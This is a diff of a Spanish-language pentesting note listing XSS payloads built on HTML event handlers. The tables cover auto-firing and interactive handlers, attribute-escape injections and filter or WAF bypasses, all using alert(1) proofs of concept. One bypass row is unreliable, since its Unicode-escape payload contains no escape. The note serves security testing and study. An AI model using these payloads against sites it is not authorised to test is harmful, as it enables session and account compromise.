@@ -1,67 +1,70 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/xss
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[Cross-Site Scripting (XSS)]]"
+  - '[[Cross-Site Scripting (XSS)]]'
 ---
 # XSS - Manejadores de Eventos HTML
 
-___
+***
 
 ## Cheatsheet
-```
-<pre><code></code></pre>
-```
 
-|               **Vector / Manejador**               |                                               **Payload de Ejemplo**                                                |                                                                                 **Contexto de Inyección y Explotación**                                                                                  |
-| :------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
-|       <br><pre><code>`onerror`</code></pre>        |                           <br><pre><code>`<img src="x" onerror="alert(1)">`</code></pre>                            |       <br>**Automático.** El evento se dispara instantáneamente cuando el navegador no puede cargar el recurso (origen inválido `x`). Es uno de los vectores más confiables y utilizados.<br><br>        |
-|        <br><pre><code>`onload`</code></pre>        |                                <br><pre><code>`<svg onload="alert(1)">`</code></pre>                                |               <br>**Automático.** Ejecuta el código tan pronto como el elemento se renderiza en el [[DOM]]. Excelente alternativa cuando las etiquetas de imagen están filtradas.<br><br>                |
-|       <br><pre><code>`onfocus`</code></pre>        |                         <br><pre><code>`<input autofocus onfocus="alert(1)">`</code></pre>                          | <br>**Automático / Interactivo.** Al combinarlo con el atributo `autofocus`, obligo al navegador a centrarse en el elemento de inmediato, disparando el evento sin requerir un clic del usuario.<br><br> |
-|     <br><pre><code>`onmouseover`</code></pre>      |                         <br><pre><code>`<h1 onmouseover="alert(1)">Texto</h1>`</code></pre>                         |                 <br>**Interactivo.** Requiere que la víctima pase el cursor por encima del elemento. Útil para evadir bloqueos estrictos sobre eventos de ejecución automática.<br><br>                  |
-|       <br><pre><code>`onclick`</code></pre>        |                       <br><pre><code>`<a href="#" onclick="alert(1)">Click</a>`</code></pre>                        |             <br>**Interactivo.** Depende de la acción explícita del usuario. Frecuente al escapar del valor de un atributo para inyectar un nuevo manejador (`" onclick="alert(1)`).<br><br>             |
-| <br><br><pre><code>`onanimationstart`</code></pre> | <br><pre><code>`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`</code></pre> |            <br>**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.             |
-|       <br><pre><code>`ontoggle`</code></pre>       |                          <br><pre><code>`<details open ontoggle="alert(1)">`</code></pre>                           |              <br>**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.<br><br>              |
-|     <br><pre><code>`onhashchange`</code></pre>     |                   <br><pre><code>`<body onhashchange="alert(1)"><a href="#x">Ir</a>`</code></pre>                   |                 <br>**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.<br><br>                  |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `<img src="x" onerror="alert(1)">` | XSS automático al fallar carga de `x` | Vector más confiable. Filtro `<script>` filtrado. |
+| `<svg onload="alert(1)">` | XSS automático al renderizar SVG | Tag `<img>` filtrado o whitelist solo permite SVG. |
+| `<input autofocus onfocus="alert(1)">` | XSS automático sin interacción — `autofocus` dispara `onfocus` | Filtros bloquean `onerror`/`onload`. |
+| `<details open ontoggle="alert(1)">` | XSS automático — `open` cambia state, dispara `ontoggle` | Vector poco común, bypassea WAFs viejos. |
+| `<select autofocus onfocus=alert(1)><option>x</option></select>` | Mismo patrón que input autofocus | Alternativa cuando `<input>` filtrado. |
+| `<keygen autofocus onfocus=alert(1)>` | XSS via tag deprecada pero soportada en algunos browsers | Targets legacy. |
+| `<video><source onerror=alert(1)>` | XSS al fallar carga de `<source>` | Filtros que solo bloquean `<img>`. |
+| `<audio src=x onerror=alert(1)>` | Mismo principio con audio | Alt. |
+| `<body onload=alert(1)>` | Si controlás reflejo en `<body>` o sale al top-level | Reflexión en HTML body raíz. |
+| `<h1 onmouseover="alert(1)">hover</h1>` | XSS al pasar mouse | Vector interactivo — requiere acción usuario. |
+| `<a href="#" onclick="alert(1)">click</a>` | XSS al click | Interactivo. |
+| `<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">` | XSS automático via CSS animation | Bypass avanzado de WAFs. |
+| `<body onhashchange="alert(1)">` + `<a href="#x">click</a>` | XSS en SPAs al cambiar fragment | Apps single-page navigation-based. |
 ^xss-eventos
 
-### Inyección en Contextos Preexistentes
+### Escape de atributo con event handler
 
-La efectividad de los manejadores de eventos se maximiza cuando no es posible inyectar etiquetas HTML nuevas, pero sí alterar los atributos de una etiqueta existente. Para lograr esto, es imperativo escapar del atributo donde aterriza la inyección.
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `" autofocus onfocus="alert(1)` | Sale del atributo, agrega event handler sin cerrar tag | Reflejo en `<input value="INYECCIÓN">`. `<`/`>` filtrados. |
+| `" type="image" src="x" onerror="alert(1)` | Override del `type` del input para habilitar `onerror` | Reflejo en `<input type="hidden" value="INYECCIÓN">`. |
+| `' onmouseover='alert(1)` | Variante con comillas simples | Reflejo en `value='INYECCIÓN'`. |
+| `x onerror=alert(1)//` | Espacio como separador en HTML sin comillas | Reflejo en `<img src=INYECCIÓN>` (sin comillas). |
+^xss-eventos-escape
 
-- **Inyección en Atributo de Valor:** Si la entrada se refleja en `<input type="text" value="INYECCIÓN_AQUÍ">`, el objetivo es cerrar el atributo `value` y añadir el manejador de eventos sin cerrar la etiqueta.
-    - Payload: `" autofocus onfocus="alert(1)`
-    - Resultado en el DOM: `<input type="text" value="" autofocus onfocus="alert(1)">`
-        
-- **Inyección Dinámica de Tipos:** A veces es necesario sobrescribir propiedades del elemento anfitrión para habilitar el evento.
-    - Payload: `" type="image" src="x" onerror="alert(1)`
-    - Resultado en el DOM: `<input type="text" value="" type="image" src="x" onerror="alert(1)">`
+### Bypass de filtros léxicos
 
-
-___
-
-### Evasión de Filtros Estructurales
-
-Dado que los manejadores de eventos operan como atributos HTML, se benefician de las reglas de decodificación permisivas de los motores de los navegadores, ofreciendo vías adicionales para eludir restricciones de entrada:
-- **Insensibilidad a Mayúsculas:** Los nombres de atributos no distinguen entre mayúsculas y minúsculas en HTML. `oNeRrOr=alert(1)` es procesado de forma idéntica a `onerror=alert(1)`.
-- **Uso de Separadores Alternativos:** Los navegadores aceptan múltiples delimitadores entre atributos, no solo espacios. Se pueden utilizar barras diagonales (`/`) u otros espacios en blanco. Ej: `<svg/onload=alert(1)>`
-- **Codificación de Entidades en el Payload:** A diferencia de la etiqueta de script directa, el contenido dentro de un manejador de eventos HTML se decodifica _antes_ de enviarse al intérprete de JavaScript. Esto me permite ofuscar el código mediante entidades HTML. Ej: `<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`
-
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `<svg/onload=alert(1)>` | Slash en vez de espacio entre tag y atributo | Filtro regex `<svg ` (con espacio). |
+| `<sVg OnLoAd=alert(1)>` | Mixed-case bypass | Regex case-sensitive. |
+| `<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>` | HTML entities decoded antes de JS | Filtro busca literal `alert`. |
+| `<svg onload="alert(1)">` | Unicode escape en JS dentro de event handler | Filtro bloquea `alert` pero deja `\u`. |
+^xss-eventos-bypass
 
 ___
 
 ## Overview
 
-Cuando las defensas de una aplicación web, como un [[Web Application Firewall]] (WAF) o un filtro de [[Sanitización]], bloquean explícitamente la etiqueta de script estándar, recurro a vectores alternativos. La inyección a través de manejadores de eventos (event handlers) HTML permite ejecutar código JavaScript aprovechando el ciclo de vida de las etiquetas estándar del [[DOM]] o la interacción del usuario.
+Cuando `<script>` está blacklisted, event handlers permiten ejecutar JS via atributos `on*` en tags permitidas.
 
-El principio radica en inyectar atributos específicos (que comienzan con `on...`) dentro de etiquetas HTML permitidas, forzando al navegador a ejecutar el payload cuando se cumpla la condición del evento en lugar de depender de la ejecución directa de un bloque `<script>`.
+**Auto-disparados (preferidos):** `onerror` (img/audio/video con src inválido), `onload` (svg/iframe/body), `onfocus`+`autofocus`, `ontoggle`+`details open`, `onanimationstart` con CSS keyframe.
 
-___
+**Requieren interacción:** `onclick`, `onmouseover`, `onhashchange`. Menos confiables pero válidos para PoC.
+
+Para escapar atributo sin disparar `<`/`>` filter → ver tabla `escape de atributo` arriba.
+
+***
